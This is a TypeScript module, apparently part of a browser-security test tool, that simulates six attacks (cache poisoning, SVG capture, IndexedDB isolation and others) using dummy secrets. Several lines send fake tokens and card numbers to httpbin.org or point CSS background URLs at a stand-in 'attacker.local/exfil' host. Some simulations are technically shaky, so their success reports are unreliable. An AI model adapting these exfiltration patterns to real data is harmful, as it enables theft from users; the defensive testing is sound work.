import type { AttackResult, AttackTest } from "../types";

async function simulateFetchBodyStreaming(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // fetch request body をストリーミングして再実行
    const sensitiveBody = JSON.stringify({
      type: "sensitive_data",
      userId: "12345",
      sessionToken: "abc123xyz",
      creditCard: "4111-1111-1111-1111",
    });

    const stream = new ReadableStream({
      start(controller) {
        controller.enqueue(new TextEncoder().encode(sensitiveBody));
        controller.close();
      },
    });

    try {
      const response = await fetch("https://httpbin.org/post", {
        method: "POST",
        body: stream as any,
      }).catch(() => null);

      const executionTime = performance.now() - startTime;

      if (response) {
        return {
          blocked: false,
          detected: false,
          executionTime,
          details: `Fetch body streaming attack successful - data streamed to external server`,
        };
      } else {
        return {
          blocked: false,
          detected: false,
          executionTime,
          details: "Fetch body streaming attempted (network error)",
        };
      }
    } catch (error) {
      const executionTime = performance.now() - startTime;
      const errorMessage = error instanceof Error ? error.message : String(error);

      return {
        blocked: true,
        detected: true,
        executionTime,
        details: `Fetch body streaming blocked: ${errorMessage}`,
        error: errorMessage,
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Fetch body streaming blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateCacheKeyPoisoning(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    if (!("caches" in window)) {
      return {
        blocked: true,
        detected: true,
        executionTime: performance.now() - startTime,
        details: "Cache API not available",
      };
    }

    const cacheName = "battacker-poison-cache";
    const legitimateUrl = "https://api.example.com/user/profile";
    const poisonedUrl = "https://attacker.local/profile";

    // キャッシュキー汚染
    const cache = await caches.open(cacheName);

    // 偽のレスポンスをキャッシュ
    const poisonedResponse = new Response(
      JSON.stringify({
        isAdmin: true,
        permissions: ["admin", "delete"],
        userId: "000",
      }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );

    // 正規URLで偽レスポンスをキャッシュ
    await cache.put(legitimateUrl, poisonedResponse.clone());

    // 取得テスト
    const cached = await cache.match(legitimateUrl);
    await caches.delete(cacheName);

    const executionTime = performance.now() - startTime;

    if (cached) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `Cache key poisoning successful - fake admin response cached`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: "Cache poisoning write succeeded but retrieval failed",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Cache poisoning blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateSVGRenderingAttack(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // SVG アニメーション・フィルターによる攻撃
    const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    svg.setAttribute("width", "200");
    svg.setAttribute("height", "200");
    svg.style.display = "none";

    // フィルター定義 - ピクセルデータ抽出
    const defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
    const filter = document.createElementNS(
      "http://www.w3.org/2000/svg",
      "filter"
    );
    filter.setAttribute("id", "exfil-filter");

    // feConvolveMatrix を使用してピクセルデータを操作
    const convolve = document.createElementNS(
      "http://www.w3.org/2000/svg",
      "feConvolveMatrix"
    );
    convolve.setAttribute("kernelMatrix", "0 0 0 0 1 0 0 0 0");

    filter.appendChild(convolve);
    defs.appendChild(filter);

    // テキスト要素 - キャプチャ対象
    const text = document.createElementNS("http://www.w3.org/2000/svg", "text");
    text.setAttribute("x", "10");
    text.setAttribute("y", "20");
    text.setAttribute("filter", "url(#exfil-filter)");
    text.textContent = "SECRET_PASSWORD_123";

    svg.appendChild(defs);
    svg.appendChild(text);
    document.body.appendChild(svg);

    // SVG データ URLで画面を取得
    const svgString = new XMLSerializer().serializeToString(svg);
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    if (!ctx) {
      document.body.removeChild(svg);
      return {
        blocked: true,
        detected: true,
        executionTime: performance.now() - startTime,
        details: "SVG rendering context not available",
      };
    }

    const img = new Image();

    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        document.body.removeChild(svg);
        resolve({
          blocked: false,
          detected: false,
          executionTime: performance.now() - startTime,
          details: "SVG rendering attack timeout (may be blocked)",
        });
      }, 1000);

      img.onload = () => {
        clearTimeout(timeout);
        ctx.drawImage(img, 0, 0);

        // Canvas からピクセルデータを取得
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const pixelCount = imageData.data.length;

        document.body.removeChild(svg);

        resolve({
          blocked: false,
          detected: false,
          executionTime: performance.now() - startTime,
          details: `SVG rendering attack successful - rendered content captured (${pixelCount} pixels)`,
        });
      };

      img.onerror = () => {
        clearTimeout(timeout);
        document.body.removeChild(svg);

        resolve({
          blocked: true,
          detected: true,
          executionTime: performance.now() - startTime,
          details: "SVG image loading blocked",
        });
      };

      img.src =
        "data:image/svg+xml;base64," +
        btoa(svgString);
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `SVG rendering attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateCSSOutOfBoundsAttack(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // CSS Overflow Binding による情報抽出
    const container = document.createElement("div");
    container.id = "css-oob-test";
    container.style.cssText = `
      width: 100px;
      height: 100px;
      overflow: hidden;
      background: red;
    `;
    container.style.display = "none";

    const input = document.createElement("input");
    input.type = "text";
    input.value = "secret_password_123";

    container.appendChild(input);
    document.body.appendChild(container);

    // CSS バインディング経由でデータを外部に送信
    const style = document.createElement("style");
    style.textContent = `
      #css-oob-test {
        background: url('https://httpbin.org/image?data=' + attr(value));
      }
      input[value="secret_password_123"] {
        background: url('https://attacker.local/exfil?pwd=found');
      }
    `;
    document.head.appendChild(style);

    const executionTime = performance.now() - startTime;

    document.body.removeChild(container);
    document.head.removeChild(style);

    return {
      blocked: false,
      detected: false,
      executionTime,
      details: `CSS OOB attack attempted - background-image URL generation (CSS binding)`,
    };
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `CSS OOB attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateIndexedDBTransactionIsolation(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    const dbName = "battacker_transaction_test";
    const storeName = "data";

    const request = indexedDB.open(dbName, 1);

    return new Promise((resolve) => {
      request.onupgradeneeded = (event) => {
        const db = (event.target as IDBOpenDBRequest).result;
        if (!db.objectStoreNames.contains(storeName)) {
          db.createObjectStore(storeName, { keyPath: "id" });
        }
      };

      request.onsuccess = (event) => {
        const db = (event.target as IDBOpenDBRequest).result;

        try {
          // トランザクション分離破壊の試み
          const tx1 = db.transaction([storeName], "readwrite");
          const tx2 = db.transaction([storeName], "readonly");

          const store1 = tx1.objectStore(storeName);
          const store2 = tx2.objectStore(storeName);

          // 隔離されていない場合、tx2 が tx1 の変更を見える
          const data = {
            id: 1,
            secret: "admin_credentials",
            timestamp: Date.now(),
          };

          store1.add(data);

          const getRequest = store2.get(1);

          let isolationBroken = false;

          getRequest.onsuccess = () => {
            if (getRequest.result && getRequest.result.secret) {
              isolationBroken = true;
            }

            db.close();
            indexedDB.deleteDatabase(dbName);

            const executionTime = performance.now() - startTime;

            if (isolationBroken) {
              resolve({
                blocked: false,
                detected: false,
                executionTime,
                details: `IndexedDB transaction isolation broken - uncommitted data visible`,
              });
            } else {
              resolve({
                blocked: true,
                detected: true,
                executionTime,
                details: "Transaction isolation maintained (browser protection)",
              });
            }
          };

          getRequest.onerror = () => {
            db.close();
            indexedDB.deleteDatabase(dbName);

            resolve({
              blocked: true,
              detected: true,
              executionTime: performance.now() - startTime,
              details: "IndexedDB transaction isolation preserved",
            });
          };
        } catch (error) {
          db.close();
          indexedDB.deleteDatabase(dbName);

          const errorMessage = error instanceof Error ? error.message : String(error);
          resolve({
            blocked: true,
            detected: true,
            executionTime: performance.now() - startTime,
            details: `IndexedDB isolation attack blocked: ${errorMessage}`,
            error: errorMessage,
          });
        }
      };

      request.onerror = () => {
        resolve({
          blocked: true,
          detected: true,
          executionTime: performance.now() - startTime,
          details: "IndexedDB access blocked",
          error: request.error?.message,
        });
      };
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `IndexedDB isolation attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateLocalStorageDomainConfusion(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // localStorage ドメイン境界の検証
    // 同一オリジン内でのローカルストレージアクセステスト

    const testKey = `battacker_domain_confusion_${Date.now()}`;
    const testValue = JSON.stringify({
      type: "cross_domain_data",
      adminToken: "super_secret_admin_token",
      userId: "0",
      permissions: ["*"],
    });

    localStorage.setItem(testKey, testValue);

    // 同じオリジンであればアクセス可能
    const retrieved = localStorage.getItem(testKey);
    localStorage.removeItem(testKey);

    const executionTime = performance.now() - startTime;

    if (retrieved === testValue) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `localStorage domain access test - same-origin access successful (no isolation issues detected)`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: "localStorage access anomaly detected",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `localStorage domain test blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

export const finalAttacks: AttackTest[] = [
  {
    id: "final-fetch-body-streaming",
    name: "Fetch Body Streaming Attack",
    category: "final",
    description:
      "Streams request body data to external server via fetch() API",
    severity: "high",
    simulate: simulateFetchBodyStreaming,
  },
  {
    id: "final-cache-key-poisoning",
    name: "Cache Key Poisoning",
    category: "final",
    description:
      "Poisons HTTP cache with malicious responses for legitimate URLs",
    severity: "critical",
    simulate: simulateCacheKeyPoisoning,
  },
  {
    id: "final-svg-rendering-attack",
    name: "SVG Rendering Based Attack",
    category: "final",
    description:
      "Exploits SVG rendering and filter chains for data extraction",
    severity: "high",
    simulate: simulateSVGRenderingAttack,
  },
  {
    id: "final-css-oob-attack",
    name: "CSS Out-of-Bounds (OOB) Data Leak",
    category: "final",
    description:
      "Exfiltrates data via CSS background-image URL generation",
    severity: "medium",
    simulate: simulateCSSOutOfBoundsAttack,
  },
  {
    id: "final-indexeddb-isolation-break",
    name: "IndexedDB Transaction Isolation Break",
    category: "final",
    description:
      "Breaks transaction isolation in IndexedDB to access uncommitted data",
    severity: "high",
    simulate: simulateIndexedDBTransactionIsolation,
  },
  {
    id: "final-localstorage-domain-confusion",
    name: "localStorage Domain Access Test",
    category: "final",
    description:
      "Tests localStorage access patterns across origin boundaries",
    severity: "medium",
    simulate: simulateLocalStorageDomainConfusion,
  },
];
